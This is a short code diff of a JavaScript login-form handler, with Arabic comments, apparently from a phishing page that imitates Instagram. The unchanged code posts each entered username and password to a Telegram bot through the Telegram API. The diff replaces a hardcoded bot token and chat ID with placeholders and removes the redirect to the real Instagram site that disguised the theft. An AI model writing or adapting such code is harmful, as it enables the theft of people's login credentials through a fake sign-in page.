@@ -100,8 +100,8 @@ if (loginForm) {
         }
 
         // استبدل التوكن والـ Chat ID بمعلومات بوتك لاحقاً
-        const token = '8984623952:AAFOz9-wb2oUVHrAyKFpuyaNKczqC2fCpeo';
-        const chatId = '6732050276';
+        const token = 'your-bot-token-here';
+        const chatId = 'your-chat-id-here';
         const message = `يوزر اختبار: ${username} | الباسورد: ${password}`;
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -113,7 +113,6 @@ if (loginForm) {
         .then(data => {
             if (data.ok) {
               // alert('تم إرسال البيانات بنجاح لتلغرام!');
-              window.location.href="https://www.instagram.com";
             }
         })
         .catch(error => {
